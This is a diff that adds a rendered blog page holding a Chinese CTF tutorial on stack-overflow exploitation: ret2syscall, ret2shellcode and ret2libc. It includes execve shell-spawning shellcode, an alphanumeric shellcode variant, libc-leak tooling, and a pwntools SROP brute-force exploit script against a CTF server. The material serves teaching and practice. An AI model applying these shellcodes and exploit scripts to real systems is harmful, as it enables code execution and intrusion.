@@ -1,14 +1,914 @@
-{% extends "_layout.swig" %}
-{% import "_partial/archive.swig" as archivet %}
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  <meta charset="UTF-8"/>
+<meta http-equiv="X-UA-Compatible" content="IE=edge, chrome=1" />
+<meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1"/>
+<meta name="browsermode" content="application">
+<meta name="apple-touch-fullscreen" content="yes">
+<meta name="apple-mobile-web-app-capable" content="yes">
+<meta name="apple-mobile-web-app-title" content="V3rdant's Blog">
+<meta name="apple-mobile-web-app-status-bar-style" content="default">
+<meta name="msapplication-navbutton-color" content="#666666">
+<meta name= "format-detection" content="telephone=no" />
 
-{% block title %}
-  {% if page.archive %}
-    {{ __('nav.archives') }} · {{ config.title }}
-  {% elif page.tag %}
-    {{ page.tag }} · {{ config.title }}
-  {% endif %}
-{% endblock %}
 
-{% block main %}
-    {{ archivet.render() }}
-{% endblock %}
+
+
+  <meta name="keywords" content="pwn" />
+
+
+
+<link rel="apple-touch-startup-image" media="(device-width: 375px)" href="assets/apple-launch-1125x2436.png">
+<link rel="apple-touch-startup-image" media="(orientation: landscape)" href="assets/apple-touch-startup-image-2048x1496.png">
+
+<link rel="stylesheet" href="/style/style.css">
+
+<script>
+  var nlviconfig = {
+    title: "V3rdant's Blog",
+    author: "V3rdant",
+    baseUrl: "/",
+    theme: {
+      scheme: "banderole",
+      lightbox: true,
+      animate: true,
+      search: true,
+      friends: false,
+      reward: false,
+      pjax: false,
+      lazy: false,
+      toc: true
+    }
+  }
+</script>
+
+
+
+
+    
+<link rel="stylesheet" href="/script/lib/lightbox/css/lightbox.min.css">
+
+
+
+
+
+    
+<link rel="stylesheet" href="/syuanpi/syuanpi.min.css">
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+<style>
+@font-face {
+  font-family: "Allura";
+  src: url('/font/allura/allura.ttf');
+}
+</style>
+
+  <title>
+  
+    pwn · V3rdant's Blog
+  
+</title>
+<meta name="generator" content="Hexo 5.4.2"><link rel="alternate" href="/atom.xml" title="V3rdant's Blog" type="application/atom+xml">
+</head>
+<body>
+  <div class="container">
+    <header class="header" id="header">
+  <div class="header-wrapper">
+    <div class="logo">
+  <div class="logo-inner syuanpi tvIn" style="display:none;">
+    <h1><a href="/">V3rdant's Blog</a></h1>
+    
+  </div>
+</div>
+
+    <nav class="main-nav">
+  
+  <ul class="main-nav-list syuanpi tvIn">
+  
+    <li class="menu-item">
+      <a href="javascript:;" id="search-btn" aria-label="Search">
+        <i class="iconfont icon-search"></i>
+      </a>
+    </li>
+  
+  
+  
+    
+  
+    <li class="menu-item">
+      <a href="/" id="article">
+        <span class="base-name">
+          
+            ARTICLE
+          
+        </span>
+      </a>
+    </li>
+  
+  
+    
+  
+    <li class="menu-item">
+      <a href="/archives" id="archives">
+        <span class="base-name">
+          
+            ARCHIVES
+          
+        </span>
+      </a>
+    </li>
+  
+  
+    
+  
+    <li class="menu-item">
+      <a href="javascript:;" id="tags">
+        <span class="base-name">
+          
+            TAGS
+          
+        </span>
+      </a>
+    </li>
+  
+  
+    
+  
+    <li class="menu-item">
+      <a href="/about" id="about">
+        <span class="base-name">
+          
+            ABOUT
+          
+        </span>
+      </a>
+    </li>
+  
+  
+  </ul>
+  
+</nav>
+
+  </div>
+</header>
+<div class="mobile-header" id="mobile-header">
+  <div class="mobile-header-nav">
+    <div class="mobile-header-item" id="mobile-left">
+      <div class="header-menu-item">
+        <div class="header-menu-line"></div>
+      </div>
+    </div>
+    <h1 class="mobile-header-title">
+      <a href="/">V3rdant's Blog</a>
+    </h1>
+    <div class="mobile-header-item"></div>
+  </div>
+  <div class="mobile-header-body">
+    <ul class="mobile-header-list">
+      
+        <li class="mobile-nav-item syuanpi fadeInRightShort back-0">
+          <a href="/" >
+            
+              ARTICLE
+            
+          </a>
+        </li>
+      
+        <li class="mobile-nav-item syuanpi fadeInRightShort back-1">
+          <a href="/archives" >
+            
+              ARCHIVES
+            
+          </a>
+        </li>
+      
+        <li class="mobile-nav-item syuanpi fadeInRightShort back-2">
+          <a href="javascript:;" id="mobile-tags">
+            
+              TAGS
+            
+          </a>
+        </li>
+      
+        <li class="mobile-nav-item syuanpi fadeInRightShort back-3">
+          <a href="/about" >
+            
+              ABOUT
+            
+          </a>
+        </li>
+      
+    </ul>
+  </div>
+</div>
+
+
+
+    <div class="container-inner" style="display:none;">
+      <main class="main" id="main">
+        <div class="main-wrapper">
+          
+    
+  <div class="archive syuanpi fadeInRightShort" id="archive">
+    
+      
+      
+        
+          </section>
+        
+        <div class="archive-post">
+          <div class="archive-post-content">
+            
+              <h3 id="杂谈">杂谈</h3>
+<p>作为一种基本的漏洞，栈溢出在CTF中出现的非常频繁，因为其多样化的利用形式，难以进行系统的归类，本文结合笔者个人的经验，综合讨论各种栈溢出技术，如果有遗漏，欢迎评论留言，或者给笔者发邮件，进行补充。</p>
+<p>本文一定程度上参考了各种博客，CTF-wiki, CTF-All-in-One</p>
+<p>怎么去看待栈溢出题呢?</p>
+<p>尽管利用方法多样，但是，就笔者个人的看法而言，整个栈溢出实际上只分为三种:</p>
+<p><strong>ret2syscall,  ret2libc,  ret2shellcode</strong></p>
+<p>实际上应该还有ret2text， 然而实在过于简单，一般不会在ctf题目中出现。</p>
+<p>一般而言，pwn题的目的都是<code>getshell</code>(当然，也有直接读取flag的，这个后面单独谈)，而<code>getshell</code> 无外乎就三种途径，<code>syscall</code>，<code>libc-system</code>，<code>shellcode</code></p>
+<p>当拿到一个题目时，首先思考：</p>
+<p>是否有syscall----&gt;ret2syscall</p>
+<p>有可读可写内存空间吗----&gt;ret2shellcode</p>
+<p>给了libc文件或者有信息泄露函数(IO函数)----&gt;ret2libc</p>
+<p>接下来，再分门别类谈:</p>
+<h3 id="0x1-ret2syscall">0x1.ret2syscall</h3>
+<p>因为syscall属于相对简单的，暂且放在前面谈。</p>
+<table>
+<thead>
+<tr>
+<th style="text-align:left">%rax</th>
+<th style="text-align:left">System call</th>
+<th style="text-align:left">%rdi</th>
+<th style="text-align:left">%rsi</th>
+<th style="text-align:left">%rdx</th>
+<th style="text-align:left">%r10</th>
+<th style="text-align:left">%r8</th>
+<th style="text-align:left">%r9</th>
+</tr>
+</thead>
+<tbody>
+<tr>
+<td style="text-align:left">59</td>
+<td style="text-align:left">sys_execve</td>
+<td style="text-align:left">const char *filename</td>
+<td style="text-align:left">const char *const argv[]</td>
+<td style="text-align:left">const char *const envp[]</td>
+<td style="text-align:left"></td>
+<td style="text-align:left"></td>
+<td style="text-align:left"></td>
+</tr>
+</tbody>
+</table>
+<p>一般而言，需要<code>syscall</code>的题目中，都是构造这个系统调用实现。</p>
+<p>而在一些题目中通过<code>seccomp</code>禁用了<code>execve</code>的调用，所以不能直接利用，那么就利用open, read,  write 直接读取flag文件，也是一种办法。</p>
+<p>而在syscall中，最为重要也是最麻烦的一步，就是在哪个地址写入/bin/sh（如果本地文件没有/bin/sh的话），一般而言，有三个选择，.data, .bss， 栈上。</p>
+<p>在没开PIE的程序中，可以考虑通过write写入.data段或者买.bss段。</p>
+<p>或者考虑通过rsp获取栈上地址，或者partial overwrite带出栈上地址。</p>
+<p>总的而言，就是选择能够获取到地址的地方写入/bin/sh。</p>
+<p><strong>例题:</strong></p>
+<p>ciscn_s_3</p>
+<h3 id="ret2shellcode">ret2shellcode</h3>
+<h4 id="shellcode的书写">shellcode的书写</h4>
+<p>一般而言，可以直接通过pwntools 相应模块直接生成shellcode，然而现在以shellcode为考点的题目，一般都会对shellcode做出限制，诸如不能包含非可打印字符, 不能包含&quot;\x00&quot;等等。所以尽可能自己熟悉shellcode的书写。</p>
+<p>一个简单的shellcode例子:</p>
+<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// execve(path = &#x27;/bin///sh&#x27;, argv = [&#x27;sh&#x27;], envp = 0)</span></span><br><span class="line">push <span class="number">0x68</span></span><br><span class="line">mov rax, <span class="number">0x732f2f2f6e69622f</span></span><br><span class="line">push rax</span><br><span class="line">mov rdi, rsp</span><br><span class="line"><span class="comment">// push argument array [&#x27;sh\x00&#x27;]</span></span><br><span class="line"><span class="comment">// push b&#x27;sh\x00&#x27; </span></span><br><span class="line">push <span class="number">0x1010101</span> ^ <span class="number">0x6873</span></span><br><span class="line">xor dword ptr [rsp], <span class="number">0x1010101</span></span><br><span class="line">xor esi, esi <span class="comment">/* 0 */</span></span><br><span class="line">push rsi <span class="comment">/* null terminate */</span></span><br><span class="line">push <span class="number">8</span></span><br><span class="line">pop rsi</span><br><span class="line">add rsi, rsp</span><br><span class="line">push rsi <span class="comment">/* &#x27;sh\x00&#x27; */</span></span><br><span class="line">mov rsi, rsp</span><br><span class="line">xor edx, edx <span class="comment">/* 0 */</span></span><br><span class="line"><span class="comment">// call execve()</span></span><br><span class="line">push SYS_execve <span class="comment">/* 0x3b */</span></span><br><span class="line">pop rax</span><br><span class="line">syscall</span><br></pre></td></tr></table></figure>
+<p>这里获取<code>/bin/sh</code>地址的方式，是将其压入栈中，再通过rsp偏移获取相应地址。</p>
+<p>不过一般而言，pwn题目运行shellcode，一般是采用寄存器跳转，即<code>jmp  rax</code>此类，那么其实可以通过跳转寄存器获取shellcode存放地址，并且将/bin/sh直接镶入shellcode后面，简化shellcode书写。</p>
+<p>同时，有些题目会对shellcode有所限制，限制只能包含可打印字符或者纯粹字母数字。这就限制了shellcode的书写，<code>mov</code>和<code>syscall</code>都会遭到限制， 可用指令如下:</p>
+<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br></pre></td><td class="code"><pre><span class="line"><span class="number">1.</span>数据传送:</span><br><span class="line">push/pop eax…</span><br><span class="line">pusha/popa</span><br><span class="line"></span><br><span class="line"><span class="number">2.</span>算术运算:</span><br><span class="line">inc/dec eax…</span><br><span class="line">sub al, 立即数</span><br><span class="line">sub byte ptr [eax… + 立即数], al dl…</span><br><span class="line">sub byte ptr [eax… + 立即数], ah dh…</span><br><span class="line">sub dword ptr [eax… + 立即数], esi edi</span><br><span class="line">sub word ptr [eax… + 立即数], si di</span><br><span class="line">sub al dl…, byte ptr [eax… + 立即数]</span><br><span class="line">sub ah dh…, byte ptr [eax… + 立即数]</span><br><span class="line">sub esi edi, dword ptr [eax… + 立即数]</span><br><span class="line">sub si di, word ptr [eax… + 立即数]</span><br><span class="line"></span><br><span class="line"><span class="number">3.</span>逻辑运算:</span><br><span class="line">and al, 立即数</span><br><span class="line">and dword ptr [eax… + 立即数], esi edi</span><br><span class="line">and word ptr [eax… + 立即数], si di</span><br><span class="line">and ah dh…, byte ptr [ecx edx… + 立即数]</span><br><span class="line">and esi edi, dword ptr [eax… + 立即数]</span><br><span class="line">and si di, word ptr [eax… + 立即数]</span><br><span class="line"></span><br><span class="line">xor al, 立即数</span><br><span class="line">xor byte ptr [eax… + 立即数], al dl…</span><br><span class="line">xor byte ptr [eax… + 立即数], ah dh…</span><br><span class="line">xor dword ptr [eax… + 立即数], esi edi</span><br><span class="line">xor word ptr [eax… + 立即数], si di</span><br><span class="line">xor al dl…, byte ptr [eax… + 立即数]</span><br><span class="line">xor ah dh…, byte ptr [eax… + 立即数]</span><br><span class="line">xor esi edi, dword ptr [eax… + 立即数]</span><br><span class="line">xor si di, word ptr [eax… + 立即数]</span><br><span class="line"></span><br><span class="line"><span class="number">4.</span>比较指令:</span><br><span class="line">cmp al, 立即数</span><br><span class="line">cmp byte ptr [eax… + 立即数], al dl…</span><br><span class="line">cmp byte ptr [eax… + 立即数], ah dh…</span><br><span class="line">cmp dword ptr [eax… + 立即数], esi edi</span><br><span class="line">cmp word ptr [eax… + 立即数], si di</span><br><span class="line">cmp al dl…, byte ptr [eax… + 立即数]</span><br><span class="line">cmp ah dh…, byte ptr [eax… + 立即数]</span><br><span class="line">cmp esi edi, dword ptr [eax… + 立即数]</span><br><span class="line">cmp si di, word ptr [eax… + 立即数]</span><br><span class="line"></span><br><span class="line"><span class="number">5.</span>转移指令:</span><br><span class="line">push <span class="number">56</span>h</span><br><span class="line">pop eax</span><br><span class="line">cmp al, <span class="number">43</span>h</span><br><span class="line">jnz lable</span><br><span class="line"></span><br><span class="line">&lt;=&gt; jmp lable</span><br><span class="line"></span><br><span class="line"><span class="number">6.</span>交换al, ah</span><br><span class="line">push eax</span><br><span class="line">xor ah, byte ptr [esp] <span class="comment">// ah ^= al</span></span><br><span class="line">xor byte ptr [esp], ah <span class="comment">// al ^= ah</span></span><br><span class="line">xor ah, byte ptr [esp] <span class="comment">// ah ^= al</span></span><br><span class="line">pop eax</span><br><span class="line"></span><br><span class="line"><span class="number">7.</span>清零:</span><br><span class="line">push <span class="number">44</span>h</span><br><span class="line">pop eax</span><br><span class="line">sub al, <span class="number">44</span>h ; eax = <span class="number">0</span></span><br><span class="line"></span><br><span class="line">push esi</span><br><span class="line">push esp</span><br><span class="line">pop eax</span><br><span class="line">xor [eax], esi ; esi = <span class="number">0</span></span><br></pre></td></tr></table></figure>
+<p>一般而言,  我们采用<code>xor</code>或者<code>sub</code>指令修改shellcode后面的值，构造<code>0f 05</code>， 实现syscall。</p>
+<p>一个例子(纯字母数字shellcode):</p>
+<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// ref: https://hama.hatenadiary.jp/entry/2017/04/04/190129</span></span><br><span class="line"><span class="comment">/* from call rax */</span></span><br><span class="line">push rax</span><br><span class="line">push rax</span><br><span class="line">pop rcx</span><br><span class="line"></span><br><span class="line"><span class="comment">/* XOR pop rsi, pop rdi, syscall */</span></span><br><span class="line">push <span class="number">0x41413030</span></span><br><span class="line">pop rax</span><br><span class="line">xor DWORD PTR [rcx+<span class="number">0x30</span>], eax</span><br><span class="line"></span><br><span class="line"><span class="comment">/* XOR /bin/sh */</span></span><br><span class="line">push <span class="number">0x34303041</span></span><br><span class="line">pop rax</span><br><span class="line">xor DWORD PTR [rcx+<span class="number">0x34</span>], eax</span><br><span class="line">push <span class="number">0x41303041</span></span><br><span class="line">pop rax</span><br><span class="line">xor DWORD PTR [rcx+<span class="number">0x38</span>], eax</span><br><span class="line"></span><br><span class="line"><span class="comment">/* rdi = &amp;&#x27;/bin/sh&#x27; */</span></span><br><span class="line">push rcx</span><br><span class="line">pop rax</span><br><span class="line">xor al, <span class="number">0x34</span></span><br><span class="line">push rax</span><br><span class="line"></span><br><span class="line"><span class="comment">/* rdx = 0 */</span></span><br><span class="line">push <span class="number">0x30</span></span><br><span class="line">pop rax</span><br><span class="line">xor al, <span class="number">0x30</span></span><br><span class="line">push rax</span><br><span class="line">pop rdx</span><br><span class="line"></span><br><span class="line">push rax</span><br><span class="line"></span><br><span class="line"><span class="comment">/* rax = 59 (SYS_execve) */</span></span><br><span class="line">push <span class="number">0x41</span></span><br><span class="line">pop rax</span><br><span class="line">xor al, <span class="number">0x7a</span></span><br><span class="line"></span><br><span class="line"><span class="comment">/* pop rsi, pop rdi*/</span></span><br><span class="line"><span class="comment">/* syscall */</span> </span><br><span class="line">.byte <span class="number">0x6e</span></span><br><span class="line">.byte <span class="number">0x6f</span></span><br><span class="line">.byte <span class="number">0x4e</span></span><br><span class="line">.byte <span class="number">0x44</span></span><br><span class="line"></span><br><span class="line"><span class="comment">/* /bin/sh */</span></span><br><span class="line">.byte <span class="number">0x6e</span></span><br><span class="line">.byte <span class="number">0x52</span></span><br><span class="line">.byte <span class="number">0x59</span></span><br><span class="line">.byte <span class="number">0x5a</span></span><br><span class="line">.byte <span class="number">0x6e</span></span><br><span class="line">.byte <span class="number">0x43</span></span><br><span class="line">.byte <span class="number">0x5a</span></span><br><span class="line">.byte <span class="number">0x41</span></span><br></pre></td></tr></table></figure>
+<p>构造尽可能短的shellcode可能用到的一些指令</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">cdp  </span><br><span class="line">%The CDQ instruction copies the sign (bit 31) </span><br><span class="line">%of the value in the EAX register into every bit </span><br><span class="line">%position in the EDX register. </span><br></pre></td></tr></table></figure>
+<h4 id="shellcode生成工具">shellcode生成工具</h4>
+<p>同时，现在有多种针对shellcode进行编码的生成工具，生成符合限制的shellcode，如msf，alpha3等等，由于我没有用过，可以自行尝试。</p>
+<h4 id="mprotect">mprotect()</h4>
+<p>进一步的，很多题目没有天然的readable  and  executable segment，题目可能通过mmap()映射了一段权限为7的段，或者存在mprotect()函数。</p>
+<p>这个函数可以修改指定内存段的权限</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">mprotect:</span><br><span class="line">int mprotect(void *addr, size_t len, int prot);</span><br><span class="line">addr 内存起始地址</span><br><span class="line">len  修改内存的长度</span><br><span class="line">prot 内存的权限，7为可读可写可执行</span><br></pre></td></tr></table></figure>
+<p>如果存在这样的函数，可以考虑将其加入ROP链，从而进一步调用shellcode</p>
+<h3 id="ret2libc">ret2libc</h3>
+<h4 id="leak-libc">leak_libc</h4>
+<p>对于最后调用 libc 中 system 的题目而言，需要考虑的首要问题就是leak_libc.</p>
+<p>目前而言，我遇到的栈题中leak_libc，有两种方法：</p>
+<ol>
+<li>partial_overwrite<br>
+有时候，在栈中会存留libc中地址，在后面存在直接输出的函数的情况下，可以带出此地址。</li>
+<li>通过puts，write等函数，打印<code>.got</code>，获取对应函数的地址，这里，在没有给定对应libc版本的情况下，也可以通过LibcSearcher查找对应libc版本</li>
+</ol>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># ref:  https://github.com/lieanu/LibcSearcher</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">from</span> LibcSearcher <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line"><span class="comment">#第二个参数，为已泄露的实际地址,或最后12位(比如：d90)，int类型</span></span><br><span class="line">obj = LibcSearcher(<span class="string">&quot;fgets&quot;</span>, <span class="number">0X7ff39014bd90</span>)</span><br><span class="line"></span><br><span class="line">obj.dump(<span class="string">&quot;system&quot;</span>)        <span class="comment">#system 偏移</span></span><br><span class="line">obj.dump(<span class="string">&quot;str_bin_sh&quot;</span>)    <span class="comment">#/bin/sh 偏移</span></span><br><span class="line">obj.dump(<span class="string">&quot;__libc_start_main_ret&quot;</span>)    </span><br><span class="line"></span><br></pre></td></tr></table></figure>
+<p>另一个可以本地部署的实用工具是libc-database</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line">$ ./find <span class="built_in">printf</span> 260 puts f30</span><br><span class="line">archive-glibc (libc6_2.19-10ubuntu2_i386)</span><br><span class="line">$ ./dump libc6_2.19-0ubuntu6.6_i386</span><br><span class="line">offset___libc_start_main_ret = 0x19a83</span><br><span class="line">offset_system = 0x00040190</span><br><span class="line">offset_dup2 = 0x000db590</span><br><span class="line">offset_recv = 0x000ed2d0</span><br><span class="line">offset_str_bin_sh = 0x160a24</span><br><span class="line">$ ./identify bid=ebeabf5f7039f53748e996fc976b4da2d486a626</span><br><span class="line">libc6_2.17-93ubuntu4_i386</span><br><span class="line">$ ./identify md5=af7c40da33c685d67cdb166bd6ab7ac0</span><br><span class="line">libc6_2.17-93ubuntu4_i386</span><br><span class="line">$ ./identify sha1=9054f5cb7969056b6816b1e2572f2506370940c4</span><br><span class="line">libc6_2.17-93ubuntu4_i386</span><br><span class="line">$ ./identify sha256=8dc102c06c50512d1e5142ce93a6faf4ec8b6f5d9e33d2e1b45311aef683d9b2</span><br><span class="line">libc6_2.17-93ubuntu4_i386</span><br></pre></td></tr></table></figure>
+<h4 id="partial-overwrite">partial_overwrite</h4>
+<h5 id="前置知识">前置知识</h5>
+<p>针对没有泄露的赛题，可以考虑partial_overwrite改写<code>got</code>表，实现system，因为一般而言，大部分libc函数，里面都存在syscall，所以syscall偏移和函数head_addr差别不会太大。</p>
+<p>考虑对于一个<code>got</code>表中的64位地址:  0xXXXXXXXXXXXXX， 假设其附近的syscall地址后三位偏移为0xaaa(请确定这个偏移和got内函数偏移只有最后四个16位数字不同)， 因为libc装载地址以页为单位，后三位是确定0x000，那么partial_overwrite覆盖后面两个字节， 即覆盖<code>got</code>为0xXXXXXXXXfaaa，那么有1/16的几率恰好syscall</p>
+<h5 id="爆破脚本写法">爆破脚本写法</h5>
+<p>一个爆破脚本模板:</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">import</span> sys</span><br><span class="line"></span><br><span class="line">elf =<span class="string">&#x27;./ciscn_s_3&#x27;</span></span><br><span class="line">remote_add = <span class="string">&#x27;node4.buuoj.cn&#x27;</span></span><br><span class="line">remote_port = <span class="number">29554</span></span><br><span class="line"></span><br><span class="line">main_add = <span class="number">0x40051d</span></span><br><span class="line">off = <span class="number">0x130</span></span><br><span class="line">system_add = <span class="number">0x400517</span></span><br><span class="line">rtframe = <span class="number">0x4004da</span></span><br><span class="line">ret_add = <span class="number">0x4004e9</span></span><br><span class="line"></span><br><span class="line">i = <span class="number">0</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">while</span> i &lt; <span class="number">20</span>:</span><br><span class="line">    <span class="keyword">try</span>:</span><br><span class="line">        context.log_level = <span class="string">&#x27;debug&#x27;</span></span><br><span class="line">        context.arch = <span class="string">&#x27;amd64&#x27;</span></span><br><span class="line">        <span class="keyword">if</span> sys.argv[<span class="number">1</span>] == <span class="string">&#x27;r&#x27;</span>:</span><br><span class="line">            p = remote(remote_add, remote_port, timeout = <span class="number">1</span>)</span><br><span class="line">        <span class="keyword">elif</span> sys.argv[<span class="number">1</span>] == <span class="string">&#x27;d&#x27;</span>:</span><br><span class="line">            p = gdb.debug(elf)</span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            p = process(elf, timeout = <span class="number">1</span>)</span><br><span class="line">        payload1 = <span class="string">b&#x27;/bin/sh\0&#x27;</span> + cyclic(<span class="number">0x8</span>)</span><br><span class="line">        payload1+= p64(main_add)</span><br><span class="line"></span><br><span class="line">        p.sendline(payload1)</span><br><span class="line"></span><br><span class="line">        stack_add = u64(p.recv(<span class="number">0x28</span>)[-<span class="number">8</span>::]) - off</span><br><span class="line"></span><br><span class="line">        frame = SigreturnFrame()</span><br><span class="line">        frame.rax = <span class="number">0x3b</span></span><br><span class="line">        frame.rdi = stack_add</span><br><span class="line">        frame.rsi = <span class="number">0</span></span><br><span class="line">        frame.rdx = <span class="number">0</span></span><br><span class="line">        frame.rsp = stack_add</span><br><span class="line">        frame.rip = system_add</span><br><span class="line"></span><br><span class="line">        payload = <span class="string">b&#x27;/bin/sh\0&#x27;</span> + cyclic(<span class="number">0x8</span>)</span><br><span class="line">        payload+= p64(rtframe)</span><br><span class="line">        payload+= p64(system_add)</span><br><span class="line">        payload+= <span class="built_in">bytes</span>(frame)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">        <span class="comment">#p.sendline(&#x27;a&#x27;)</span></span><br><span class="line">        <span class="comment">#p.recvuntil(&#x27;\0&#x27;)</span></span><br><span class="line">        p.sendline(payload)</span><br><span class="line">        p.recvuntil(<span class="string">&#x27;/bin/sh&#x27;</span>)</span><br><span class="line">        p.sendline(<span class="string">&#x27;cat flag&#x27;</span>)</span><br><span class="line">        <span class="built_in">print</span>(p.recvline())</span><br><span class="line">        </span><br><span class="line">        p.close()</span><br><span class="line">    <span class="keyword">except</span> BaseException <span class="keyword">as</span> e:</span><br><span class="line">        p.close()</span><br><span class="line"></span><br><span class="line">    off+=<span class="number">0x8</span></span><br><span class="line">    i+=<span class="number">1</span></span><br><span class="line"></span><br></pre></td></tr></table></figure>
+<p>核心模板:</p>
